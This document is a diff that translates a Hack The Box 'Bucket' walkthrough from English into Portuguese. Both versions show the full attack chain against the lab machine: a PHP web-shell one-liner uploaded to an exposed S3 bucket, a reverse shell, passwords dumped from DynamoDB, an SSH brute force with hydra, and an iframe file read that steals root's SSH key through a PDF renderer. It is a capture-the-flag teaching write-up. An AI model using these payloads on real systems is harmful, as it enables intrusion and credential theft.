@@ -1,7 +1,7 @@
 ---
 title: "Walktrough: HTB Bucket"
 namespace: htb-bucket
-language: en-US
+language: pt-BR
 category: Walkthrough
 tags:
   - HackTheBox
@@ -14,24 +14,24 @@ header:
 redirect_from: /writeup/2021/04/htb-bucket
 ---
 
-Hello guys!
+Olá pessoal!
 
-This week's machine will be **Bucket**, another median-rated machine from [Hack The Box](https://www.hackthebox.eu/), created by [MrR3boot](https://app.hackthebox.eu/users/13531).<!--more-->
+A máquina desta semana será **Bucket**, outra máquina classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [MrR3boot](https://app.hackthebox.eu/users/13531).<!--more-->
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they're retired.
+:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.
 {: .notice--info}
 
 ![HTB Bucket](https://i.imgur.com/KEhyzUW.png){: .align-center}
 
-Solving this box was pretty cool, where I had the opportunity to "play" a little with AWS storage services, even being in a local instance normally used by developers.
+Particularmente achei essa máquina bem legal, onde tive a oportunidade de "brincar" um pouco com os serviços de armazenamento da AWS, mesmo que em uma instância local para desenvolvedores.
 
-Its resolution was closely linked to this service, where we had to identify a way to include a file on the published website to get a reverse shell and later the user flag with the credentials harvested during enumeration.
+A sua resolução esteve bastante ligada a este serviço onde tivemos que identificar uma forma de incluir um arquivo no site publicado para obter um shell reverso, obter a flag de user com credenciais existentes no DynamoDB.
 
-Root flag was obtained after abuse of an application still under development, where we used a vulnerable code to get an `id_rsa` key and thus gain interactive shell as root.
+O flag de root foi obtido após abuso de uma aplicação ainda em desenvolvimento, onde utilizamos uma vulnerabilidade de LFI para obter a chave do `id_rsa` e assim obter acesso interativo com esta conta.
 
-## Enumeration
+## Enumeração
 
-As usual, we start with a quick `nmap` scan, to identify the services currently published on this machine:
+Como de costume, iniciamos com a enumeração rápida do `nmap` para identificar os serviços publicados nesta máquina:
 
 ```bash
 $ nmap -sC -sV -Pn -oA quick 10.10.10.212
@@ -56,9 +56,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### 80/TCP - Serviço HTTP
 
-Once I have noticed a redirect to `bucket.htb`, I have modified the local hosts file to map this hostname to the box IP address.
+Uma vez que notei um redirect para `bucket.htb`, incluí a entrada no arquivo hosts apontando para o endereço IP da máquina.
 
-After accessing the website, as none of the images were loaded figured out after a `curl` call that they were pointing to `s3.bucket.htb`, which was later added to the local host file as well.
+Ao acessar o site, notei que diversas imagens não foram carregadas adequadamente, as quais apontavam para `s3.bucket.htb`, vide chamada `curl` abaixo. Após incluir também esta entrada no arquivo hosts, o carregamento da página ocorreu com sucesso.
 
 ```bash
 $ curl -L http://bucket.htb | grep -Eo 'href=".*"|src=".*"' | sort -u
@@ -77,11 +77,11 @@ src="http://s3.bucket.htb/adserver/images/malware.png" alt="Malware" height="160
 
 #### `s3.bucket.htb`
 
-After identifying the DNS `s3.bucket.htb` instantly made the link of S3 with [Amazon S3](https://aws.amazon.com/s3), a cloud service that provides blob storage.
+Ao identificar o DNS `s3.bucket.htb` me chamou atenção para o nome, o qual faz referência ao serviço [Amazon S3](https://aws.amazon.com/s3), que provê armazenamento de arquivos no formato blob em nuvem.
 
-Checking the webserver of the request, noticed that for one of the image URLs the webserver that answered the request was different from Apache seen in nmap scan (`hypercorn-h11`), which means that there's some kind of proxy or a different web server answering the request for this virtual host.
+Analisando o webserver da requisição para uma das URLs de imagem, notei que se utiliza de outro webserver (`hypercorn-h11`), diferente do Apache listado no Scan do NMAP para a página na URL `bucket.htb`, o que significa que temos outro serviço na máquina ou há algum tipo de proxy na requisição neste virtual host.
 
-To understand what we have in this structure, I have started a `gobuster` enumeration and have found two interesting directories: *health* and *shell*
+Para validar o que temos nesta estrutura, realizei uma enumeração utilizando o `gobuster` e encontrei dois diretórios interessantes: *health* e *shell*
 
 ```bash
 $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb -o gobuster-s3.txt
@@ -103,7 +103,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 Progress: 2643 / 220561 (1.20%)
 ```
 
-Is important to notice that these are directories and not pages, once the result of the web request as seen in curl below is different if the slash (`/`) is present in the end or not:
+É importante mencionar que são diretórios, pois o resultado para as chamadas em cada um dos nomes via `curl` com ou sem a barra ao final é diferente, conforme podemos ver abaixo:
 
 ```bash
 $ curl -L http://s3.bucket.htb/health                                                                       
@@ -125,19 +125,19 @@ $ curl -L http://s3.bucket.htb/shell/
 [...]
 ```
 
-As the last request (`curl -L http://s3.bucket.htb/shell/`) returned an HTML page, I've retried it using a browser and noticed that I was accessing **DynamoDB Web Shell**.
+Como a última chamada (`curl -L http://s3.bucket.htb/shell/`) retornou o conteúdo de uma página HTML, refiz a requisição no navegador e notei que estava acessando à página do **DynamoDB Web Shell**.
 
-Researching a little about this service I could determine it is a storage emulator for AWS, possibly a [Localstack](https://github.com/localstack/localstack), very popular among developers.
+Pesquisando um pouco pude chegar à conclusão de que estávamos utilizando um emulador de storage da AWS, possivelmente uma instancia do [Localstack](https://github.com/localstack/localstack), muito popular entre desenvolvedores.
 
 ![DynamoDB Web Shell - Bucket HTB](https://i.imgur.com/VXFAvpG.png){: .align-center}
 
-Playing with some samples on the page, I was able to get some information about the existing tables (ListTables e DescribeTable), as below, where I could identify some information like the region (`us-east-1`) and a table called `users`, as well as its respective resource name `arn:aws:dynamodb:us-east-1:000000000000:table/users`.
+Brincando com alguns dos exemplos da página, consegui listar algumas informações da instancia (ListTables e DescribeTable), conforme abaixo, onde podemos listar algumas informações como a região do serviço (`us-east-1`) e uma tabela chamada `users` no DynamoDB, assim como o seu respectivo resource name `arn:aws:dynamodb:us-east-1:000000000000:table/users`.
 
 ![DynamoDB Web Shell - List - Bucket HTB](https://i.imgur.com/IkavRee.png){: .align-center}
 
-Considering we're talking about a LocalStack instance, I have found that would be possible to use [AWS CLI](https://aws.amazon.com/cli), AWS command-line interface utility, to connect to this service, as described in the following post [Local Development with AWS on LocalStack (reflectoring.io)](https://reflectoring.io/aws-localstack/).
+Considerando que estamos falando de uma instância do LocalStack, descobri que é possível utilizar o [awscli](https://aws.amazon.com/cli), utilitário de linha de comando da AWS, para se conectar à esta instância local, conforme post [Local Development with AWS on LocalStack (reflectoring.io)](https://reflectoring.io/aws-localstack/).
 
-As `awscli` is more flexible to enumerate and work with resources than DynamoDB Web Shell, I have installed it using `apt` and connected to it using the information obtained in the post mentioned above. For credentials, any value can be used, once it isn't a true AWS service.
+Como o `awscli` é mais flexível para enumerar e trabalhar com os recursos do que o DynamoDB Web Shell, segui para a instalação via `apt` e sua conexão utilizando as informações obtidas no post acima citado, o qual foi executado conforme abaixo. Para as credenciais, quaisquer valores são válidos, uma vez que não se trata de uma instância real em execução na AWS.
 
 ```bash
 # Install aws cli
@@ -150,7 +150,7 @@ Default region name [None]: us-east-1
 Default output format [None]:
 ```
 
-Reading about `awscli` for DynamoDB, ran some simple queries to list tables and their existing entries, as below, where I was able to get some username and passwords that could be useful later.
+Lendo a documentação do `awscli` para o DynamoDB, executei algumas consultas simples para listar as tabelas e entradas existentes, conforme abaixo, onde pude obter alguns usuários e senhas que poderão ser úteis futuramente.
 
 ```bash
 $ aws dynamodb list-tables \
@@ -201,7 +201,7 @@ $ aws dynamodb scan \
 }
 ```
 
-As we know that we also have an **s3** running, enumerated some information about existing containers and blobs, where `adserver` was found (where we already knew due to the URL of the images listed), and confirmed what else is hosted in this bucket.
+Como sabemos que temos um **s3** também em execução, enumerei algumas informações sobre os containers blob existentes, onde foi encontrado o `adserver` (o que já tínhamos uma ideia por conta da URL das imagens conforme previamente enumerado) e confirmamos qual o conteúdo deste bucket.
 
 ```bash
 $ aws s3 ls \
@@ -223,15 +223,15 @@ $ aws s3 ls s3://adserver/images/ \
 2021-02-26 11:52:02      16486 malware.png
 ```
 
-## Initial Access
+## Acesso inicial
 
-Once we have access to the s3 bucket and know which contents are available and how to use them, the first thing to do is to upload a reverse shell payload to the website and then proceed with enumeration. To keep things simple, I'll use the following PHP web shell:
+Uma vez que temos acesso ao blob s3 e sabemos quais conteúdos disponíveis e como utilizá-lo, a primeira coisa a se fazer é realizar o upload de um arquivo para shell reverso. Em primeiro momento vamos validar a possibilidade de utilizar php com um webshell simples conforme abaixo:
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-After creating the file, upload it to the bucket using `awscli`:
+Após a criação do arquivo, realizado o upload via CLI vide comandos abaixo:
 
 ```bash
 $ aws s3 cp ./exploit.php s3://adserver/ \
@@ -245,7 +245,7 @@ $ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserv
 2021-02-26 11:56:02       5344 index.html
 ```
 
-After trying to access it a few seconds later, noticed that the file was removed by another process. To circumvent this, made the execution call right after the upload command, running the command `id`, where I was able to confirm that this approach worked.
+Ao tentar acessá-lo alguns instantes depois, notei que o arquivo que enviei foi removido por outro processo. Para tentar contornar a questão, configurei para que a chamada de execução de comando fosse realizada assim que o upload fosse finalizado, executando o comando `id`, onde pudemos confirmar o sucesso na tarefa realizada.
 
 ```bash
 $ aws s3 cp ./exploit.php s3://adserver/ \
@@ -254,7 +254,7 @@ upload: ./exploit.php to s3://adserver/exploit.php
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-To get a reverse shell, replaced the `exploit.php` by [pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell) that after modifying it starts automatically to the listener previously defined, without the need of parameters in the payload, which resulted in success after a few attempts.
+Para um shell reverso, alterei o arquivo a ser enviado de `exploit.php` pelo [pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell) que já iniciaria a conexão reversa a um listener previamente definido, sem a necessidade de enviar parâmetros no payload, o qual tivemos sucesso após algumas tentativas.
 
 ```bash
 aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php s3://adserver/ && curl -L http://bucket.htb/exploit.php
@@ -262,13 +262,13 @@ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php
 
 ## User flag
 
-Now with a reverse shell to the machine, ran `linpeas.sh` to make it easier the enumeration, where the following points were identified:
+Uma vez com acesso ao shell da máquina, executei o `linpeas.sh` para simplificar a enumeração, onde os seguintes itens foram identificados:
 
-- Local user `roy` has console access and, enumerating his home directory found the file `user.txt` and folder `project`, access to both denied using `www-data` credentials.
+- Usuário local `roy` possui acesso à máquina e, enumerando seu diretório observado a existencia do arquivo `user.txt`, o qual não temos acesso leitura com a conta `www-data` além de uma pasta `project` a ser inspecionada.
 
-  - This user has no running processes that could allow us to hijack them so we would need to obtain his credentials to proceed with this machine.
+  - Este usuário não possui nenhum processo em execução que eventualmente permita a exploração logo precisaremos obter suas credenciais de alguma forma.
 
-- Other services are running in this box, listening in ports 4566, 8000, and 38443, which could be used to escalate privileges later.
+- Alguns outros serviços encontram-se em execução nesta máquina, funcionando nas portas 4566, 8000 e 38443, que possivelmente venham a dar privilégios a outras atividades em um segundo momento.
 
 ```plaintext
 [+] Active Ports                                                                                         
@@ -282,11 +282,11 @@ tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
 tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
 ```
 
-- This box has also containers in execution (`ctr`, `runc`), probably from localstack, being also a possibility when checking for privesc paths.
+- Esta máquina possui serviços de container em execução (`ctr`, `runc`), que executam provavelmente o localstack e que poderiam ser avaliados para escalação de privilégios.
 
-- There's a directory `/var/www/bucket-app` that could be used by one of the apps previously identified, but also doesn't allow us to read it with `www-data` credentials.
+- Existe um diretório `/var/www/bucket-app` que pode ser a aplicação servida em uma das portas identificadas, mas que não possuímos acesso de leitura com a conta utilizada.
 
-From the points discussed, what called more attention to me was the other services, so started by checking apache configurations (`/etc/apache2/sites-enabled`) where we had the file `000-default.conf` listed below, but nothing about 38443, but was able to get insights about 4566 and 8000, which published the content from `/var/www/bucket-app` folder.
+Dos pontos mencionados, o que mais chamou atenção foi o possível website em execução nas portas citadas, logo iniciei por verificar as configurações ativas no Apache (`/etc/apache2/sites-enabled`) onde tínhamos o arquivo `000-default.conf` listado abaixo, mas não encontrei nada sobre a porta 38443, mas tive a informação sobre a porta 4566, que é publicada pela porta 80 e na porta 8000, que é publicado o website disponível na pasta `/var/www/bucket-app`.
 
 ```apache
 <VirtualHost 127.0.0.1:8000>
@@ -319,9 +319,9 @@ From the points discussed, what called more attention to me was the other servic
 </VirtualHost>
 ```
 
-Besides being able to connect to this service locally, we'll need some credentials to tunnel some communication via SSH and properly enumerate this service.
+Embora possível identificar os serviços ativos apenas a partir da máquina local, precisaremos realizar a exploração apenas via linha de comando ou precisaremos de uma conta na máquina para tunelar o acesso a partir de SSH.
 
-Once this website had nothing interesting, decided to test the passwords previously collected in DynamoDB for user `roy`, and luckily we had success. Below is the `hydra` execution which automated this SSH Brute Force.
+Já que os websites não permitiram muitos detalhes na enumeração, decidi testar as senhas obtidas anteriormente via DynamoDB para o usuário `roy` e felizmente tivemos sucesso. Abaixo a execução do `hydra` que utilizei para automatizar  brute force na conta via SSH.
 
 ```bash
 $ hydra -l roy -P passwords 10.10.10.212 -t 4 ssh
@@ -335,7 +335,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-26 12:55:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-26 12:55:40
 ```
 
-Once we have access to the machine as `roy`, I have collected the user flag:
+Uma vez que tínhamos agora acesso à máquina com as credenciais do usuário `roy`, coletei a flag de usuário após me conectar via SSH:
 
 ```bash
 roy@bucket:~$ id
@@ -346,9 +346,9 @@ roy@bucket:~$ cat user.txt
 
 ## Root flag
 
-Now as `roy`, was able to check the contents of both `project` and `/var/www/bucket-app` folders, which were very similar to each other. To inspect the contents better, made a copy of `/var/www/bucket-app` for analysis.
+Com o acesso ao usuário `roy` pude validar o acesso aos diretórios `project`, que tem aparentemente uma estrutura de um website, além de conseguir com esta conta acessar o conteúdo da aplicação em `/var/www/bucket-app` que possui estrutura bastante similar ao encontrado na pasta `project`, o qual fiz uma cópia para análise a partir da máquina atacante.
 
-Checking the contents of `index.php` we have something very interesting: a hidden function that generates a PDF file with the rendered content of a `Ransomware` alert in DynamoDB if a POST request is made with the body contents of `action=get_alerts`, storing it in `/var/www/bucket-app/files/` folder.
+Analisando o conteúdo de `index.php` temos um algo bem interessante: uma função escondida para que sempre que chamada POST na página `http://127.0.0.1:8000` com o parâmetro `action=get_alerts`, é feita uma consulta numa tabela `alerts` no DynamoDB em que os valores com Title `Ransonware` são incluídos em um PDF e disponibilizados na pasta `/var/www/bucket-app/files/`.
 
 ```php
 <?php
@@ -382,14 +382,14 @@ else
 ?>
 ```
 
-Once we don't have a table called `alerts`, as already enumerated, we'll need to create it with the attributes `title` and `data`, which will contain the HTML content to be rendered and later stored in a PDF, possibly allowing us to get some sensitive data from this machine.
+Uma vez que não temos uma tabela chamada `alerts`, conforme já enumerado, precisaremos criá-la com os atributos `title` e `data`, este, por sua vez, com conteúdo HTML a ser renderizado e posteriormente salvo no formato PDF, permitindo a possível obtenção de dados sensíveis da máquina.
 
-For the initial test, as described in AWS documentation in [this link](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html), I've created a script to create the table, include the Ransomware entry, and then make the POST call to generate the PDF.
+Para os testes iniciais, conforme documentação da AWS disponível [neste link](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html), criei um script para criação da tabela, inclusão de uma entrada e posterior chamada POST na URL em questão para gerar o arquivo PDF.
 
-To make it easier this process, which is being executed from the attacker machine, executed the following processes:
+Para simplificar este processo, que está sendo feito da máquina atacante, realizados os seguintes procedimentos:
 
-- From the attacker machine, created an RSA key (`ssh-keygen`) and associated it with `roy`'s account to prevent asking for a password during the process.
-- In the attacker machine was also made a port forwarding using SSH, allowing us to call port 8000 locally and this request would be routed to 8000 to bucket, as below
+- Na máquina atacante, criado chave RSA (`ssh-keygen`) e atribuido chave pública dela ao usuário `roy` na máquina bucket para que não fosse necessário o uso de senhas durante a autenticação.
+- Na máquina atacante também foi criado o tunelamento da porta local 8000/TCP, a qual foi redirecionada para a porta 8000 na máquina bucket, fazendo o serviço disponível também localmente, o que posteriormente foi possível validar acessando localmente a página conforme evidencia abaixo
 
 ```bash
 ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000 
@@ -397,7 +397,7 @@ ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000
 
 ![Website 8000/TCP via SSH Tunnel](https://i.imgur.com/HIP7f4S.png)
 
-After some attempts, noticed that similarly in the beginning while uploading the exploit, the tables and entries created were deleted, preventing us from easily getting the content desired. The solution was to chain the commands as made previously processing the request as soon as the resources were available, as well as the file copy later if we had success in the initial call.
+Após algumas tentativas, notei que similar ao desafio encontrado durante o upload do shell reverso, os itens criados no DynamoDB também são removidos após algum tempo, logo foi necessário encadear todas as requisições para que tivéssemos tempo para executar a ação imediatamente assim que os recursos estivessem disponíveis, assim como a posterior cópia dos ativos se obtivermos sucesso na chamada.
 
 ```bash
 aws dynamodb create-table \
@@ -416,7 +416,7 @@ aws dynamodb put-item \
 curl --data "action=get_alerts" http://localhost:8000/
 ```
 
-After a few attempts, successfully retrieved the `result.pdf` file with the content we have passed in the DynamoDB.
+Após algumas tentativas, seguido do desafio do tempo para cópia do arquivo para a máquina atacante, foi possível gerar e copiar o arquivo PDF com base no HTML enviado.
 
 ```bash
 roy@bucket:/var/www/bucket-app/files$ ls -la
@@ -429,11 +429,11 @@ drwxr-x---+ 4 root root 4096 Feb 10 12:29 ..
 
 ![Bucket HTB - PoC](https://i.imgur.com/BQIYPiy.png){: .align-center}
 
-Once we have been able to make the request work, the second step is finding a way to get sensitive data into the PDF file.
+Uma vez que conseguimos renderizar o conteúdo desejado, precisamos encontrar uma forma de incluir arquivos na página renderizada e que resulta no PDF, de modo a dar continuidade na exploração.
 
-The easiest way would be to import `/root/root.txt`, but this doesn't give us an interactive shell in the box. Just like we did in [**Passage**]({% post_url 2021-01/2021-03-06-htb-passage %}), we can look for the file `/root/.ssh/id_rsa` and use it to SSH into the machine as root but our issue right now is to find a way to import this file in the static HTML file that will later be rendered into the PDF.
+A forma mais fácil de obter o root flag seria importar o arquivo `/root/root.txt`, porém isso não nos dá um shell reverso de fato. Seguindo o exemplo da máquina [**Passage**]({% post_url 2021-03-06-htb-passage %}), podemos buscar por um arquivo `/root/.ssh/id_rsa` e nos conectar à máquina via shell interativo, porém nosso maior problema no momento é inserir o conteúdo destes em um arquivo HTML.
 
-After some research, the easiest way without using a Javascript to make this possible would be using an **iframe**, which I've added the tag `<iframe src="/root/.ssh/id_rsa" seamless></iframe>` in the HTML content sent earlier:
+Após algumas pesquisas, a forma mais simples de alcançar este objetivo sem o uso de Javascript é utilizando um **iframe**, onde as alterações, para a qual incluí a tag `<iframe src="/root/.ssh/id_rsa" seamless></iframe>` no HTML utilizado anteriormente, conforme chamadas abaixo:
 
 ```bash
 aws dynamodb create-table \
@@ -452,7 +452,7 @@ aws dynamodb put-item \
 curl --data "action=get_alerts" http://localhost:8000/    
 ```
 
-After running it, was able to download the file at `/var/www/bucket-app/files/result.pdf` and, with the contents inside it, created the file `id_rsa`, which was used to authenticate to SSH to the box as `root`, being able to read the root.txt file.
+Após o procedimento foi possível baixar o aquivo `/var/www/bucket-app/files/result.pdf` e, com o conteúdo presente neste arquivo, criar o arquivo `id_rsa`, o qual foi posteriormente utilizado para conectar-se à máquina via SSH e obter a shell a partir do usuário `root`.
 
 ```bash
 root@bucket:~# id
@@ -461,6 +461,6 @@ root@bucket:~# cat /root/root.txt
 <redacted>
 ```
 
-I hope you guys have enjoyed this post.
+Espero que tenham gostado!
 
-See you again soon! :smiley:
+Vejo vocês novamente em breve no próximo post! :smiley:
